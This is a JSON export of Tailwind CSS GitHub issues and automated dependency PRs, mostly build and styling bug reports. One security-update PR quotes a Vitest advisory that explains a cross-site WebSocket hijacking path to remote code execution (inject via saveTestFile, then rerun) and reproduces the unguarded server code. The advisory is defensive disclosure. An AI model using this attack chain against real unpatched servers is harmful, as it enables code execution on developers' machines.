{"Data":{"TailwindCss-Issues":{"Issues":[{"Id":"2831755674","IsPullRequest":false,"CreatedAt":"2025-02-05T03:13:58","Actor":"j-mendez","Number":"16261","RawContent":null,"Title":"[Deprecation] Custom state pseudo classes have been changed production console error - v4","State":"open","Body":"After upgrading to v4 the following deprecated CSS console error.\n\n![The following deprecated error [Deprecation] Custom state pseudo classes have been changed from \":--input-width\" to \":state(input-width)\". See more here: https://github.com/w3c/csswg-drafts/issues/4805\n](https://github.com/user-attachments/assets/db1349ba-cf6d-4ad2-aaf4-5ee8f573c963)","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16261","RelatedDescription":"Open issue \"[Deprecation] Custom state pseudo classes have been changed production console error - v4\" (#16261)"},{"Id":"2831734772","IsPullRequest":false,"CreatedAt":"2025-02-05T02:56:57","Actor":"xxwangkaimin","Number":"16260","RawContent":null,"Title":"Warning message occurs during packaging when using tailwindcss3. x version in Vue3.x+Vite6.x project","State":"open","Body":"Tailwindcss configuration information:\n```ts\n// tailwind.config.ts\n\nimport type { Config } from \"tailwindcss\"\n\nexport default {\n  content: [\n    \"./index.html\",\n    \"./src/**/*.{js,ts,jsx,tsx,vue}\"\n  ],\n  darkMode: \"selector\",\n  prefix: \"\",\n  theme: {},\n  plugins: [],\n} satisfies Config\n```\n\n```ts\n// postcss.config.ts\n\nimport config from \"./tailwind.config\"\n\nexport default {\n  plugins: {\n    autoprefixer: {},\n    \"postcss-antd-fixes\": {\n      prefixes: [\"el\"]\n    },\n    \"postcss-import\": {},\n    \"postcss-preset-env\": {},\n    tailwindcss: { config },\n    \"@tailwindcss/nesting\": {}\n  },\n}\n```\n\nDependent version information:\n```json\n{\n    \"autoprefixer\": \"^10.4.20\",\n    \"postcss\": \"^8.5.1\",\n    \"postcss-antd-fixes\": \"^0.2.0\",\n    \"postcss-import\": \"^16.1.0\",\n    \"postcss-preset-env\": \"^10.1.3\",\n    \"tailwindcss\": \"^3.4.17\",\n    \"vite\": \"^6.0.5\",\n    \"vue\": \"^3.5.13\",\n}\n```\n\nAccording to the configuration information on the official website, after using @ tailwind utilities, a warning message was found during the packaging command:\n\n![Image](https://github.com/user-attachments/assets/566e2bf3-43e1-4951-90de-3f80a6da71f4)\nAfter deleting @ tailwind utilities, it is normal to use the packaging command:\n\n![Image](https://github.com/user-attachments/assets/6dd401f9-478a-4f7d-88e4-4b74b60b7ee4)","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16260","RelatedDescription":"Open issue \"Warning message occurs during packaging when using tailwindcss3. x version in Vue3.x+Vite6.x project\" (#16260)"},{"Id":"2831382450","IsPullRequest":true,"CreatedAt":"2025-02-04T21:57:05","Actor":"depfu[bot]","Number":"16257","RawContent":null,"Title":"Update all of nextjs 15.1.4 ‚Üí 15.1.6 (patch)","State":"open","Body":"\n\n\n\n\nHere is everything you need to know about this update. Please take a good look at what changed and the test results before merging this pull request.\n\n### What changed?\n\n\n\n\n#### ‚ú≥Ô∏è eslint-config-next (15.1.4 ‚Üí 15.1.6)\n\n\n\n\n\nSorry, we couldn't find anything useful about this release.\n\n\n\n#### ‚ú≥Ô∏è next (15.1.4 ‚Üí 15.1.6) ¬∑ [Repo](https://github.com/vercel/next.js)\n\n\n\n<details>\n<summary>Release Notes</summary>\n<h4><a href=\"https://github.com/vercel/next.js/releases/tag/v15.1.6\">15.1.6</a></h4>\n\n<blockquote><div class=\"markdown-alert markdown-alert-note\" dir=\"auto\">\n<p class=\"markdown-alert-title\" dir=\"auto\"><svg class=\"octicon octicon-info mr-2\" viewbox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"><path d=\"M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z\"></path></svg>Note</p>\n<p dir=\"auto\">This release is backporting bug fixes. It does <strong>not</strong> include all pending features/changes on canary.</p>\n</div>\n<h3 dir=\"auto\">Core Changes</h3>\n<ul dir=\"auto\">\n<li>fix: don't memory-leak promises passed to waitUntil (<a href=\"https://bounce.depfu.com/github.com/vercel/next.js/pull/75041\">#75041</a>)</li>\n<li>backport: fix prerender issue with intercepting routes + generateStaticParams (<a href=\"https://bounce.depfu.com/github.com/vercel/next.js/pull/75170\">#75170</a>)</li>\n</ul>\n<h3 dir=\"auto\">Credits</h3>\n<p dir=\"auto\">Huge thanks to <a href=\"https://bounce.depfu.com/github.com/lubieowoce\">@lubieowoce</a> and <a href=\"https://bounce.depfu.com/github.com/ztanner\">@ztanner</a> for helping!</p></blockquote>\n<h4><a href=\"https://github.com/vercel/next.js/releases/tag/v15.1.5\">15.1.5</a></h4>\n\n<blockquote><div class=\"markdown-alert markdown-alert-note\" dir=\"auto\">\n<p class=\"markdown-alert-title\" dir=\"auto\"><svg class=\"octicon octicon-info mr-2\" viewbox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"><path d=\"M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z\"></path></svg>Note</p>\n<p dir=\"auto\">This release is backporting bug fixes. It does <strong>not</strong> include all pending features/changes on canary.</p>\n</div>\n<h3 dir=\"auto\">Core Changes</h3>\n<ul dir=\"auto\">\n<li>Fix missing revalidate with notFound() (<a href=\"https://bounce.depfu.com/github.com/vercel/next.js/pull/75009\">#75009</a>)</li>\n<li>fix: when metadatabase is set we should not warn (<a href=\"https://bounce.depfu.com/github.com/vercel/next.js/pull/74840\">#74840</a>)</li>\n<li>Fix @vercel/og license SPDX expression (<a href=\"https://bounce.depfu.com/github.com/vercel/next.js/pull/74745\">#74745</a>)</li>\n<li>fix: ts language server rule metadata should allow null (<a href=\"https://bounce.depfu.com/github.com/vercel/next.js/pull/74704\">#74704</a>)</li>\n<li>fix: eslint rule of using img in metadata routes (<a href=\"https://bounce.depfu.com/github.com/vercel/next.js/pull/74864\">#74864</a>)</li>\n<li>Fix presentation when onerror receives an event without error (<a href=\"https://bounce.depfu.com/github.com/vercel/next.js/pull/74643\">#74643</a>)</li>\n<li>fix fetch lock not being consistently released <a href=\"https://bounce.depfu.com/github.com/vercel/next.js/pull/74623\">#74623</a> (<a href=\"https://bounce.depfu.com/github.com/vercel/next.js/pull/75028\">#75028</a>)</li>\n</ul>\n<h3 dir=\"auto\">Credits</h3>\n<p dir=\"auto\">Huge thanks to <a href=\"https://bounce.depfu.com/github.com/ijjk\">@ijjk</a>, <a href=\"https://bounce.depfu.com/github.com/huozhi\">@huozhi</a>, <a href=\"https://bounce.depfu.com/github.com/matmannion\">@matmannion</a> and <a href=\"https://bounce.depfu.com/github.com/ztanner\">@ztanner</a> for helping!</p></blockquote>\n<p><em>Does any of this look wrong? <a href=\"https://depfu.com/packages/npm/next/feedback\">Please let us know.</a></em></p>\n</details>\n\n<details>\n<summary>Commits</summary>\n<p><a href=\"https://github.com/vercel/next.js/compare/48f2588b0fea2bffb5bf6534169ee112438786a6...38a6d0177eced9b56dfcc58f83662a659195af15\">See the full diff on Github</a>. The new version differs by 14 commits:</p>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/commit/38a6d0177eced9b56dfcc58f83662a659195af15\"><code>v15.1.6</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/70997533978c9eb4cf02092fa074796ffece27f7\"><code>backport: fix prerender issue with intercepting routes + generateStaticParams (#75170)</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/819d57589a556dd0d5491d6ced9939bed0076ca1\"><code>[E2E] Fix config file conflict (#73818)</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/20f5a79c434d6702fc4f19330d22d273042a3523\"><code>fix: don&#39;t memory-leak promises passed to `waitUntil` (#75041)</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/47102cae01a63b1761b9313d9ec4e7a89119ea18\"><code>v15.1.5</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/94313366990b760e7401855d542c8dbc6b78635a\"><code>fix fetch lock not being consistently released (#75028)</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/25e84437a5992d06aaa7373971b15a391de1689f\"><code>test: fix testing snapshot</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/30b9c8f91093f50892ad0295fe1167a442f74f0c\"><code>test: add feature of overriding files (#74716)</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/79bdd868812e5eaa804a647cdfeb94a842d2070b\"><code>Fix presentation when onerror receives an event without error (#74643)</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/1882acb24662b3b647b40d9bb6133080f65bcecb\"><code>fix: eslint rule of using img in metadata routes (#74864)</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/e204a30a139a391e3583eea3d83f6564dae87a33\"><code>fix: ts language server rule metadata should allow null (#74704)</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/7666d2efa56a0d93a277a4595e0d46a765002588\"><code>Fix @vercel/og license SPDX expression (#74745)</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/84a38ffe4a48bd84e3cce83eb8cf0f2cbbab24ae\"><code>fix: when metadatabase is set we should not warn (#74840)</code></a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/1c286dd5c1b4f13b4b47424c02ed3bfd248add23\"><code>Fix missing revalidate with notFound() (#75009)</code></a></li>\n</ul>\n</details>\n\n\n\n\n\n\n\n\n\n\n\n\n---\n![Depfu Status](https://depfu.com/badges/edd6acd35d74c8d41cbb540c30442adf/stats.svg)\n\n[Depfu](https://depfu.com) will automatically keep this PR conflict-free, as long as you don't add any commits to this branch yourself. You can also trigger a rebase manually by commenting with `@depfu rebase`.\n\n<details><summary>All Depfu comment commands</summary>\n<blockquote><dl>\n<dt>@‚Äãdepfu rebase</dt><dd>Rebases against your default branch and redoes this update</dd>\n<dt>@‚Äãdepfu recreate</dt><dd>Recreates this PR, overwriting any edits that you've made to it</dd>\n<dt>@‚Äãdepfu merge</dt><dd>Merges this PR once your tests are passing and conflicts are resolved</dd>\n<dt>@‚Äãdepfu cancel merge</dt><dd>Cancels automatic merging of this PR</dd>\n<dt>@‚Äãdepfu close</dt><dd>Closes this PR and deletes the branch</dd>\n<dt>@‚Äãdepfu reopen</dt><dd>Restores the branch and reopens this PR (if it's closed)</dd>\n<dt>@‚Äãdepfu pause</dt><dd>Ignores all future updates for this dependency and closes this PR</dd>\n<dt>@‚Äãdepfu pause [minor|major]</dt><dd>Ignores all future minor/major updates for this dependency and closes this PR</dd>\n<dt>@‚Äãdepfu resume</dt><dd>Future versions of this dependency will create PRs again (leaves this PR as is)</dd>\n</dl></blockquote>\n</details>\n\n","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16257","RelatedDescription":"Open PR \"Update all of nextjs 15.1.4 ‚Üí 15.1.6 (patch)\" (#16257)"},{"Id":"2831240603","IsPullRequest":false,"CreatedAt":"2025-02-04T20:35:12","Actor":"FlavioSantoro92","Number":"16255","RawContent":null,"Title":"[v4] Angular css modules not working","State":"open","Body":"I followed the guide to create a new Angular app and install TW4, and it works.\nAfter that I created a new component, and if I use come utility class in the html file it still works, but if I use the `@apply` directive in the css file with any of the utility classes I get compilarion error:\n![image](https://github.com/user-attachments/assets/99dad0e7-7427-400d-88af-a9767a380449)\n\nIn that css file I have to use `@import` ad choose the style.css file. But importing in each needed css file the main css file means all the classes already defined in that file will be duplicated in the bundle:\n![image](https://github.com/user-attachments/assets/0162bf3e-0bbb-43f9-a362-a9ffd85c884c)\n\nAs suggested from @wongjn I should use `@reference` directive (in the doc there are Vite and Svelte mentioned, so previously I skipped that part), but actually now I have a weird behavior: ![image](https://private-user-images.githubusercontent.com/18405145/409590798-49079fcc-8dc5-4900-87f5-69c553c304a1.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3Mzg3MDEyMzQsIm5iZiI6MTczODcwMDkzNCwicGF0aCI6Ii8xODQwNTE0NS80MDk1OTA3OTgtNDkwNzlmY2MtOGRjNS00OTAwLTg3ZjUtNjljNTUzYzMwNGExLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAyMDQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMjA0VDIwMjg1NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU0ODU2YTEyZGFkNWZiYWIwYjMxYmYwNGRlZTcwNTZhYzRjZThlZWMzYTlhZTgyODFmZjI3OWJkNTQxOGMzNTImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.WISr1Iwiw2u1KP2f83W1DuSad5QJ_3jS7bEudBxho84) \nIt seems that the css variables are unset, but if I add a random class, for example `text-amber-500` all the styles are as they should be: ![image](https://private-user-images.githubusercontent.com/18405145/409592026-a069a374-85e9-4845-9bde-ff0db7cf1c6e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3Mzg3MDEyMzQsIm5iZiI6MTczODcwMDkzNCwicGF0aCI6Ii8xODQwNTE0NS80MDk1OTIwMjYtYTA2OWEzNzQtODVlOS00ODQ1LTliZGUtZmYwZGI3Y2YxYzZlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAyMDQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMjA0VDIwMjg1NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWI3NGFjZDAwOWZmMWRhMGMxY2E5MTc5MjhiODk4ZWViODBmMzQ0OTk3ZDc1MmYzZDIzMDE2MmY0OWI0YzBmODYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Iw8cK-PEPb5RIJD8PWfdiFIalaM6juGT5QlUT96BZhw)\n\nafter that, if I remove the previously added class it still works until I reload the page. I tried even put the styles.css path in the `@reference` but nothing changed.\n\nThe project was created from scratch following the guide, on macos 14.7.2, node 22.13.1 and npm 10.9.2.\nIn the IDE (Intellij Ultimate) I have that error on the directive, probably a bug in the intellisense plugin cause it won't recognize the directive at all.","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16255","RelatedDescription":"Open issue \"[v4] Angular css modules not working\" (#16255)"},{"Id":"2831003364","IsPullRequest":false,"CreatedAt":"2025-02-04T18:30:20","Actor":"thepra","Number":"16254","RawContent":null,"Title":"[v4] Wrong generated order of @tailwindcss/forms overrides","State":"open","Body":"<!-- Please provide all of the information requested below. We're a small team and without all of this information it's not possible for us to help and your bug report will be closed. -->\n\n**What version of Tailwind CSS are you using?**\n\nv4.0.3\n\n**What build tool (or framework if it abstracts the build tool) are you using?**\n\nnpx @tailwindcss/cli\n\n**What version of Node.js are you using?**\n\nv22.2.0\n\n**What browser are you using?**\n\nN/A\n\n**What operating system are you using?**\n\nWindows 10\n\n**Reproduction URL**\n\nhttps://play.tailwindcss.com/4QKIJpvMY8\n\n**Describe your issue**\n\nAfter migration all my .form-* overridings from the mentioned plugin have become @utility classes, fine, so far, except this overrides:\nform-multiselect, form-select and form-textarea\nare being put in the wrong order in the generated final css file, putting the plugins original style AFTER the overrides, creating the issue of override styles not being applied correctly and/or overridden, like in the example link. \n\nWhat should I do to fix the ordering between plugin classes and my overrides?(the other form inputs are fine, given the correct order)","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16254","RelatedDescription":"Open issue \"[v4] Wrong generated order of @tailwindcss/forms overrides\" (#16254)"},{"Id":"2830961032","IsPullRequest":true,"CreatedAt":"2025-02-04T18:09:09","Actor":"depfu[bot]","Number":"16253","RawContent":null,"Title":"üö® [security] Update vitest 2.0.5 ‚Üí 2.1.9 (minor)","State":"open","Body":"\n\n<hr>\n\nüö® <b>Your current dependencies have known security vulnerabilities</b> üö®\n\nThis dependency update fixes known security vulnerabilities. Please see the details below and assess their impact carefully. We recommend to merge and deploy this as soon as possible!\n<hr>\n\n\n\nHere is everything you need to know about this update. Please take a good look at what changed and the test results before merging this pull request.\n\n### What changed?\n\n\n\n\n#### ‚ú≥Ô∏è vitest (2.0.5 ‚Üí 2.1.9) ¬∑ [Repo](https://github.com/vitest-dev/vitest)\n\n\n<details>\n\n<summary>Security Advisories üö®</summary>\n<h4><a href=\"https://bounce.depfu.com/github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq\">üö® Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening</a></h4>\n<blockquote><h3 dir=\"auto\">Summary</h3>\n<p dir=\"auto\">Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>\n<h3 dir=\"auto\">Details</h3>\n<p dir=\"auto\">When <a href=\"https://vitest.dev/config/#api\"><code class=\"notranslate\">api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.<br>\n</p><div class=\"Box Box--condensed my-2\">\n  <div class=\"Box-header f6\">\n    <p class=\"mb-0 text-bold\">\n      <a href=\"https://bounce.depfu.com/github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\">vitest/packages/vitest/src/api/setup.ts</a>\n    </p>\n    <p class=\"mb-0 color-fg-muted\">\n        Lines 32 to 46\n      in\n      <a href=\"/vitest-dev/vitest/commit/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114\">9a581e1</a>\n    </p>\n  </div>\n  <div itemprop=\"text\" class=\"Box-body p-0 blob-wrapper blob-wrapper-embedded data\">\n    <table class=\"highlight tab-size mb-0 js-file-line-container\" data-tab-size=\"8\" data-paste-markdown-skip=\"\">\n\n        <tbody>\n<tr class=\"border-0\">\n          <td id=\"L32\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"32\"></td>\n          <td id=\"LC32\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\"> <span class=\"pl-s1\">server</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">httpServer</span><span class=\"pl-kos\">?.</span><span class=\"pl-en\">on</span><span class=\"pl-kos\">(</span><span class=\"pl-s\">'upgrade'</span><span class=\"pl-kos\">,</span> <span class=\"pl-kos\">(</span><span class=\"pl-s1\">request</span><span class=\"pl-kos\">,</span> <span class=\"pl-s1\">socket</span><span class=\"pl-kos\">,</span> <span class=\"pl-s1\">head</span><span class=\"pl-kos\">)</span> <span class=\"pl-c1\">=&gt;</span> <span class=\"pl-kos\">{</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L33\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"33\"></td>\n          <td id=\"LC33\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">   <span class=\"pl-k\">if</span> <span class=\"pl-kos\">(</span><span class=\"pl-c1\">!</span><span class=\"pl-s1\">request</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">url</span><span class=\"pl-kos\">)</span> <span class=\"pl-kos\">{</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L34\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"34\"></td>\n          <td id=\"LC34\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">     <span class=\"pl-k\">return</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L35\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"35\"></td>\n          <td id=\"LC35\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">   <span class=\"pl-kos\">}</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L36\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"36\"></td>\n          <td id=\"LC36\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">  </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L37\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"37\"></td>\n          <td id=\"LC37\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">   <span class=\"pl-k\">const</span> <span class=\"pl-kos\">{</span> pathname <span class=\"pl-kos\">}</span> <span class=\"pl-c1\">=</span> <span class=\"pl-k\">new</span> <span class=\"pl-c1\">URL</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">request</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">url</span><span class=\"pl-kos\">,</span> <span class=\"pl-s\">'http://localhost'</span><span class=\"pl-kos\">)</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L38\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"38\"></td>\n          <td id=\"LC38\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">   <span class=\"pl-k\">if</span> <span class=\"pl-kos\">(</span><span class=\"pl-s1\">pathname</span> <span class=\"pl-c1\">!==</span> <span class=\"pl-c1\">API_PATH</span><span class=\"pl-kos\">)</span> <span class=\"pl-kos\">{</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L39\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"39\"></td>\n          <td id=\"LC39\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">     <span class=\"pl-k\">return</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L40\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"40\"></td>\n          <td id=\"LC40\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">   <span class=\"pl-kos\">}</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L41\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"41\"></td>\n          <td id=\"LC41\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">  </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L42\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"42\"></td>\n          <td id=\"LC42\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">   <span class=\"pl-s1\">wss</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">handleUpgrade</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">request</span><span class=\"pl-kos\">,</span> <span class=\"pl-s1\">socket</span><span class=\"pl-kos\">,</span> <span class=\"pl-s1\">head</span><span class=\"pl-kos\">,</span> <span class=\"pl-kos\">(</span><span class=\"pl-s1\">ws</span><span class=\"pl-kos\">)</span> <span class=\"pl-c1\">=&gt;</span> <span class=\"pl-kos\">{</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L43\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"43\"></td>\n          <td id=\"LC43\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">     <span class=\"pl-s1\">wss</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">emit</span><span class=\"pl-kos\">(</span><span class=\"pl-s\">'connection'</span><span class=\"pl-kos\">,</span> <span class=\"pl-s1\">ws</span><span class=\"pl-kos\">,</span> <span class=\"pl-s1\">request</span><span class=\"pl-kos\">)</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L44\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"44\"></td>\n          <td id=\"LC44\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">     <span class=\"pl-en\">setupClient</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">ws</span><span class=\"pl-kos\">)</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L45\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"45\"></td>\n          <td id=\"LC45\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">   <span class=\"pl-kos\">}</span><span class=\"pl-kos\">)</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L46\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"46\"></td>\n          <td id=\"LC46\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\"> <span class=\"pl-kos\">}</span><span class=\"pl-kos\">)</span> </td>\n        </tr>\n    </tbody>\n</table>\n  </div>\n</div>\n<p></p>\n<p dir=\"auto\">This WebSocket server has <code class=\"notranslate\">saveTestFile</code> API that can edit a test file and <code class=\"notranslate\">rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code class=\"notranslate\">saveTestFile</code> API and then running that file by calling the <code class=\"notranslate\">rerun</code> API.<br>\n</p><div class=\"Box Box--condensed my-2\">\n  <div class=\"Box-header f6\">\n    <p class=\"mb-0 text-bold\">\n      <a href=\"https://bounce.depfu.com/github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\">vitest/packages/vitest/src/api/setup.ts</a>\n    </p>\n    <p class=\"mb-0 color-fg-muted\">\n        Lines 66 to 76\n      in\n      <a href=\"/vitest-dev/vitest/commit/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114\">9a581e1</a>\n    </p>\n  </div>\n  <div itemprop=\"text\" class=\"Box-body p-0 blob-wrapper blob-wrapper-embedded data\">\n    <table class=\"highlight tab-size mb-0 js-file-line-container\" data-tab-size=\"8\" data-paste-markdown-skip=\"\">\n\n        <tbody>\n<tr class=\"border-0\">\n          <td id=\"L66\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"66\"></td>\n          <td id=\"LC66\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\"> <span class=\"pl-k\">async</span> <span class=\"pl-en\">saveTestFile</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">id</span><span class=\"pl-kos\">,</span> <span class=\"pl-s1\">content</span><span class=\"pl-kos\">)</span> <span class=\"pl-kos\">{</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L67\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"67\"></td>\n          <td id=\"LC67\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">   <span class=\"pl-k\">if</span> <span class=\"pl-kos\">(</span><span class=\"pl-c1\">!</span><span class=\"pl-s1\">ctx</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">state</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">filesMap</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">has</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">id</span><span class=\"pl-kos\">)</span> <span class=\"pl-c1\">||</span> <span class=\"pl-c1\">!</span><span class=\"pl-en\">existsSync</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">id</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">)</span> <span class=\"pl-kos\">{</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L68\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"68\"></td>\n          <td id=\"LC68\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">     <span class=\"pl-k\">throw</span> <span class=\"pl-k\">new</span> <span class=\"pl-v\">Error</span><span class=\"pl-kos\">(</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L69\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"69\"></td>\n          <td id=\"LC69\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">       <span class=\"pl-s\">`Test file \"<span class=\"pl-s1\"><span class=\"pl-kos\">${</span><span class=\"pl-s1\">id</span><span class=\"pl-kos\">}</span></span>\" was not registered, so it cannot be updated using the API.`</span><span class=\"pl-kos\">,</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L70\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"70\"></td>\n          <td id=\"LC70\" 